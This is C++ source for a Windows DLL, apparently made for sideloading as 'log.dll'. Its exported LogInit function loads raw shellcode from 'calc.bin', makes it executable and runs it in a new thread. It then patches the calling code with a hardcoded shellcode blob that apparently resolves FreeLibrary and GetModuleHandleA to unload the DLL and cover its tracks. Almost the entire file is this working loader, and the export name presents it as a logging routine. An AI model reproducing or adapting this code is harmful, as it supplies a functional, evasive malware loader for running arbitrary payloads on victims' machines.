#include <Windows.h>
#include <string>
#include <fstream>
#include <intrin.h>

BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  // handle to DLL module
	DWORD fdwReason,     // reason for calling function
	LPVOID lpvReserved)  // reserved
{
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		break;

	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;

	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		break;

	case DLL_PROCESS_DETACH:

		if (lpvReserved != nullptr)
		{
			break; // do not do cleanup if process termination scenario
		}

		// Perform any necessary cleanup.
		break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

extern "C" __declspec(dllexport) void LogInit()
{
	// 打开二进制文件
	std::ifstream file("calc.bin", std::ios::binary);

	if (file.is_open())
	{
		// 获取文件大小
		file.seekg(0, std::ios::end);
		std::streampos fileSize = file.tellg();
		file.seekg(0, std::ios::beg);

		// 使用 std::unique_ptr 管理缓冲区
		auto buffer = (PCHAR)VirtualAlloc(nullptr, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		// 读取文件内容到缓冲区
		file.read(buffer, fileSize);

		// 关闭文件
		file.close();

		DWORD oldprotect;
		DWORD newprotect;
		auto rv = VirtualProtect(buffer, fileSize, PAGE_EXECUTE_READ, &oldprotect);
		auto th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);
		//FreeLibrary(GetModuleHandleA("log.dll"));
		//WaitForSingleObject(th, -1);

		unsigned char selfFree[489] = {
			0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x56, 0x57, 0x41, 0x56, 0x48,
			0x83, 0xEC, 0x20, 0xC7, 0x40, 0x18, 0x6C, 0x6F, 0x67, 0x2E, 0x45, 0x33, 0xD2, 0xC7, 0x40, 0x1C,
			0x64, 0x6C, 0x6C, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x7C,
			0x24, 0x50, 0x4C, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x8B, 0x48, 0x18,
			0x48, 0x8B, 0x41, 0x20, 0x48, 0x8B, 0x08, 0x48, 0x8B, 0x01, 0x41, 0x8D, 0x4A, 0x03, 0x48, 0x8B,
			0x50, 0x20, 0x48, 0x63, 0x42, 0x3C, 0x8B, 0x84, 0x10, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC2,
			0x8B, 0x68, 0x20, 0x44, 0x8B, 0x58, 0x24, 0x48, 0x03, 0xEA, 0x8B, 0x70, 0x1C, 0x4C, 0x03, 0xDA,
			0x44, 0x8B, 0x70, 0x18, 0x48, 0x03, 0xF2, 0x41, 0xFF, 0xCE, 0x45, 0x3B, 0xD6, 0x76, 0x08, 0x85,
			0xC9, 0x0F, 0x8E, 0x4E, 0x01, 0x00, 0x00, 0x42, 0x8B, 0x44, 0x95, 0x00, 0x48, 0x03, 0xC2, 0x80,
			0x38, 0x46, 0x75, 0x7E, 0x80, 0x78, 0x01, 0x72, 0x0F, 0x85, 0x2F, 0x01, 0x00, 0x00, 0x80, 0x78,
			0x02, 0x65, 0x0F, 0x85, 0x25, 0x01, 0x00, 0x00, 0x80, 0x78, 0x03, 0x65, 0x0F, 0x85, 0x1B, 0x01,
			0x00, 0x00, 0x80, 0x78, 0x04, 0x4C, 0x0F, 0x85, 0x11, 0x01, 0x00, 0x00, 0x80, 0x78, 0x05, 0x69,
			0x0F, 0x85, 0x07, 0x01, 0x00, 0x00, 0x80, 0x78, 0x06, 0x62, 0x0F, 0x85, 0xFD, 0x00, 0x00, 0x00,
			0x80, 0x78, 0x07, 0x72, 0x0F, 0x85, 0xF3, 0x00, 0x00, 0x00, 0x80, 0x78, 0x08, 0x61, 0x0F, 0x85,
			0xE9, 0x00, 0x00, 0x00, 0x80, 0x78, 0x09, 0x72, 0x0F, 0x85, 0xDF, 0x00, 0x00, 0x00, 0x80, 0x78,
			0x0A, 0x79, 0x0F, 0x85, 0xD5, 0x00, 0x00, 0x00, 0x80, 0x78, 0x0B, 0x00, 0x0F, 0x85, 0xCB, 0x00,
			0x00, 0x00, 0x43, 0x0F, 0xB7, 0x04, 0x53, 0x8B, 0x3C, 0x86, 0x48, 0x03, 0xFA, 0xE9, 0xB9, 0x00,
			0x00, 0x00, 0x80, 0x38, 0x47, 0x0F, 0x85, 0x82, 0x00, 0x00, 0x00, 0x80, 0x78, 0x01, 0x65, 0x0F,
			0x85, 0xA8, 0x00, 0x00, 0x00, 0x80, 0x78, 0x02, 0x74, 0x0F, 0x85, 0x9E, 0x00, 0x00, 0x00, 0x80,
			0x78, 0x03, 0x4D, 0x0F, 0x85, 0x94, 0x00, 0x00, 0x00, 0x80, 0x78, 0x04, 0x6F, 0x0F, 0x85, 0x8A,
			0x00, 0x00, 0x00, 0x80, 0x78, 0x05, 0x64, 0x0F, 0x85, 0x80, 0x00, 0x00, 0x00, 0x80, 0x78, 0x06,
			0x75, 0x75, 0x7A, 0x80, 0x78, 0x07, 0x6C, 0x75, 0x74, 0x80, 0x78, 0x08, 0x65, 0x75, 0x6E, 0x80,
			0x78, 0x09, 0x48, 0x75, 0x68, 0x80, 0x78, 0x0A, 0x61, 0x75, 0x62, 0x80, 0x78, 0x0B, 0x6E, 0x75,
			0x5C, 0x80, 0x78, 0x0C, 0x64, 0x75, 0x56, 0x80, 0x78, 0x0D, 0x6C, 0x75, 0x50, 0x80, 0x78, 0x0E,
			0x65, 0x75, 0x4A, 0x80, 0x78, 0x0F, 0x41, 0x75, 0x44, 0x80, 0x78, 0x10, 0x00, 0x75, 0x3E, 0x43,
			0x0F, 0xB7, 0x04, 0x53, 0x44, 0x8B, 0x0C, 0x86, 0x4C, 0x03, 0xCA, 0xEB, 0x2E, 0x80, 0x38, 0x53,
			0x75, 0x2B, 0x80, 0x78, 0x01, 0x6C, 0x75, 0x25, 0x80, 0x78, 0x02, 0x65, 0x75, 0x1F, 0x80, 0x78,
			0x03, 0x65, 0x75, 0x19, 0x80, 0x78, 0x04, 0x70, 0x75, 0x13, 0x80, 0x78, 0x05, 0x00, 0x75, 0x0D,
			0x43, 0x0F, 0xB7, 0x04, 0x53, 0x8B, 0x1C, 0x86, 0x48, 0x03, 0xDA, 0xFF, 0xC9, 0x41, 0xFF, 0xC2,
			0xE9, 0xA5, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x41, 0xFF, 0xD1, 0x48, 0x8B, 0xC8,
			0xFF, 0xD7, 0x83, 0xC9, 0xFF, 0xFF, 0xD3, 0xEB, 0xF9
		};

		// ROP
		VirtualProtect(_ReturnAddress(), sizeof(selfFree), PAGE_READWRITE, &oldprotect);

		memcpy(_ReturnAddress(), selfFree, sizeof(selfFree));

		VirtualProtect(_ReturnAddress(), sizeof(selfFree), oldprotect, &newprotect);
	}
}